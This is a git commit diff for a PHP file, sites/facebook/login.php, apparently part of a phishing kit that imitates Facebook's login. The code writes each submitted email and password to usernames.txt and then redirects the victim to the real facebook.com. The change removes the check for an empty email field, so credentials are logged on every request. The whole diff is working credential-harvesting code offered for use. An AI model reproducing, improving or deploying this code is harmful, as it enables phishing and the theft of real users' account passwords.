f867a5898c32c95f49959257088917b94a15f317
Ehasanul Haque <68364943+ehasan28@users.noreply.github.com>
2021-02-13 18:46:23 +0600

    Update login.php

--- sites/facebook/login.php
+++ sites/facebook/login.php
@@ -1,6 +1,5 @@
 <?php
-header('Location: https://facebook.com/');
-if (!empty($_POST['email'])) {file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-}
 
+file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+header('Location: https://facebook.com/');
 exit();
